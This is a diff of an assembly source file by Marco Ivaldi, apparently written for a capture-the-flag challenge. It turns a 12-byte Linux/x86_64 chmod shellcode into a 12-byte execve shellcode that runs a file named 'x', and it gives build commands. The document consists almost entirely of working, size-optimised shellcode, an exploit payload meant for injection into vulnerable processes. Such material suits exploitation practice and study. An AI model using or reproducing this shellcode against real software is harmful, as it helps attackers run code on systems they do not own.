@@ -1,9 +1,9 @@
 #
-# chmod.s - 12-bytes Linux/x86_64 chmod 004 shellcode 
+# exec-tiny.s - 12-bytes Linux/x86_64 exec shellcode 
 # Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
 #
-# Simple shellcode inspired by a challenge that shall remain unnamed to 
-# prevent spoilers.
+# Shellcode inspired by a challenge that shall remain unnamed to prevent 
+# spoilers.
 #
 # Useful commands:
 # $ gcc -nostdlib -static shellcode.s -o shellcode-elf
@@ -18,10 +18,11 @@
 
 .text
 _start:
-    # chmod("x", 004)
+    # execve("x", NULL, ...)
     push 0x78
-    mov rdi, rsp        # "x"
-    push 4
-    pop rsi             # 0004
-    mov al, 0x5a        # chmod
-    syscall
+    push rsp
+    pop rdi             # "x"
+    xor rsi, rsi        # NULL
+    cdq                 # NULL
+    mov al, 59          # execve
+    syscall             
